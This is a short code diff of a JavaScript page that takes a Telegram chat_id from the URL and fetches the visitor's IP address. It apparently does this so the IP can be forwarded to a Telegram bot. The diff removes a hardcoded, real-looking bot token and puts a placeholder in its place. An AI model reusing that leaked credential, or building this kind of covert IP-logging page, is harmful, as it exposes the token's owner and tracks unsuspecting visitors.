@@ -8,11 +8,11 @@
       const urlParams = new URLSearchParams(window.location.search);
       const chat_id = urlParams.get('u'); // u — это chat_id
 
-      const BOT_TOKEN = '8254985090:AAEmnwYKpxW5zsB5RrbzTUNj8aNA8MasEeM';
+      const BOT_TOKEN = 'ВАШ_ТОКЕН_БОТА'; // ⚠️ НЕ публикуй в открытом доступе!
 
       if (chat_id) {
         try {
-          // Получаем IP через API
+          // Получаем IP через публичный API
           const ipResponse = await fetch('https://api.ipify.org?format=json');
           const ipData = await ipResponse.json();
 
